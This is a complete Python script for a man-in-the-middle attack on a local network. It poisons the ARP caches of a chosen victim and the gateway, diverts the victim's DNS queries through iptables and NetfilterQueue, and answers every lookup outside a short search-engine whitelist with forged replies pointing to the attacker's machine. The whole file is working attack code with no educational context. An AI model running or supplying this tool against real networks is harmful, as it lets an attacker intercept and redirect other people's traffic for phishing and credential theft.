import sys
import os
import time
import threading
import socket
import signal
import subprocess
import logging

from scapy.all import ARP, Ether, srp, send, IP, UDP, DNS, DNSRR, DNSQR

from netfilterqueue import NetfilterQueue

TARGET_IP, GATEWAY_IP, FAKE_IP = "", "", ""

WHITELIST_DOMAINS = [
    "google.com", "www.google.com", "bing.com", "yahoo.com",
    "yandex.ru", "ya.ru", "dzen.ru", "duckduckgo.com"
]
WHITELIST_RESOLVED = {}

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

stop_event = threading.Event()
ORIGINAL_FORWARDING_STATE = "0"


def get_attacker_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        attacker_ip = s.getsockname()[0]
    except Exception:
        print("[-] Error: Could not determine attacker IP.")
        sys.exit(1)
    finally:
        s.close()
    return attacker_ip


def get_mac(ip):
    try:
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_packet = broadcast / arp_request
        answered_list = srp(arp_request_packet, timeout=4, verbose=False)[0]
        return answered_list[0][1].hwsrc
    except Exception:
        print(f"[-] Error: Could not determine MAC address for IP {ip}.")
        sys.exit(1)


def spoof_arp(target_ip, spoof_ip, target_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)


def restore_arp(destination_ip, source_ip, destination_mac, source_mac):
    ether_frame = Ether(dst=destination_mac)
    arp_payload = ARP(
        op=2, 
        pdst=destination_ip, 
        hwdst=destination_mac, 
        psrc=source_ip, 
        hwsrc=source_mac
    )
    send(ether_frame / arp_payload, inter=1, count=4, verbose=False)


def arp_loop(target_mac, gateway_mac):
    print("[+] ARP Poisoning thread started.")
    while not stop_event.is_set():
        spoof_arp(TARGET_IP, GATEWAY_IP, target_mac)
        spoof_arp(GATEWAY_IP, TARGET_IP, gateway_mac)
        for _ in range(20):
            if stop_event.is_set():
                break
            time.sleep(0.1)
    print("[+] ARP Poisoning thread shutting down...")


def process_packet(nf_packet):
    packet = IP(nf_packet.get_payload())
    
    if packet.haslayer(DNS) and packet[DNS].qr == 0:
        raw_qname = packet[DNS].qd.qname
        qname_str = raw_qname.decode('utf-8').rstrip('.').lower()
        
        if qname_str in WHITELIST_DOMAINS:
            resolved_ip = WHITELIST_RESOLVED.get(qname_str)
            if not resolved_ip:
                nf_packet.accept()
                return
            log_msg = f" [->] Allowed (Whitelisted): {qname_str} -> {resolved_ip}"
        else:
            resolved_ip = FAKE_IP
            log_msg = f" [->] Forged response sent: {qname_str} -> {FAKE_IP}"

        print(f"[+] Intercepted DNS Request for {qname_str} from {packet[IP].src}")
        
        spoof_packet = (
            IP(dst=packet[IP].src, src=packet[IP].dst) /
            UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /
            DNS(
                id=packet[DNS].id,
                qr=1,
                aa=1,
                qdcount=1,
                ancount=1,
                qd=DNSQR(qname=raw_qname),
                an=DNSRR(
                    rrname=raw_qname,
                    type='A',
                    rclass='IN', 
                    ttl=10,
                    rdata=resolved_ip
                )
            )
        )
        
        send(spoof_packet, verbose=False)
        print(log_msg)
        
        nf_packet.drop()
    else:
        nf_packet.accept()


def signal_handler(sig, frame):
    stop_event.set()


def manage_ip_forwarding(value):
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write(str(value))
    except Exception as e:
        print(f"[-] Failed to alter ip_forwarding state: {e}")


def manage_iptables(enable_rule):
    if enable_rule:
        os.system(f"iptables -A FORWARD -s {TARGET_IP} -p udp --dport 53 -j NFQUEUE --queue-num 1")
    else:
        os.system(f"iptables -D FORWARD -s {TARGET_IP} -p udp --dport 53 -j NFQUEUE --queue-num 1")


def main():
    global TARGET_IP, GATEWAY_IP, FAKE_IP, ORIGINAL_FORWARDING_STATE, WHITELIST_DOMAINS, WHITELIST_RESOLVED
    
    if os.geteuid() != 0:
        print("Run this program as root!")
        sys.exit(1)
        
    if len(sys.argv) != 3:
        print("Usage: python3 main.py TARGET_IP GATEWAY_IP")
        sys.exit(1)
    
    TARGET_IP = sys.argv[1]
    GATEWAY_IP = sys.argv[2]

    signal.signal(signal.SIGINT, signal_handler)
    
    FAKE_IP = get_attacker_ip()
    
    print("[*] Pre-resolving whitelisted domains...")
    for domain in WHITELIST_DOMAINS:
        try:
            WHITELIST_RESOLVED[domain] = socket.gethostbyname(domain)
        except Exception:
            print(f"[!] Warning: Could not resolve whitelist entry '{domain}'. Dynamic lookup disabled.")

    result = subprocess.run(["cat", "/proc/sys/net/ipv4/ip_forward"], capture_output=True, text=True)
    ORIGINAL_FORWARDING_STATE = result.stdout.strip()
    
    manage_ip_forwarding(value="1")
    manage_iptables(enable_rule=True)
    
    print("[*] Locating hardware targets...")
    target_mac = get_mac(TARGET_IP)
    gateway_mac = get_mac(GATEWAY_IP)
    
    arp_thread = threading.Thread(target=arp_loop, args=(target_mac, gateway_mac), daemon=True)
    arp_thread.start()
    
    print("[+] DNS Spoofer active.")
    print("[+] Press CTRL+C to halt execution.")
    
    queue = NetfilterQueue()
    queue.bind(1, process_packet)
    
    queue_thread = threading.Thread(target=queue.run, daemon=True)
    queue_thread.start()
    
    try:
        while not stop_event.is_set():
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    
    print("\n[!] Detected termination request. Re-aligning network states...")
    
    queue.unbind()
    arp_thread.join()
    
    restore_arp(TARGET_IP, GATEWAY_IP, target_mac, gateway_mac)
    restore_arp(GATEWAY_IP, TARGET_IP, gateway_mac, target_mac)
    
    manage_ip_forwarding(value=ORIGINAL_FORWARDING_STATE)
    manage_iptables(enable_rule=False)
    
    print("[+] Network configuration cleanup complete. Exiting.")


if __name__ == "__main__":
    main()
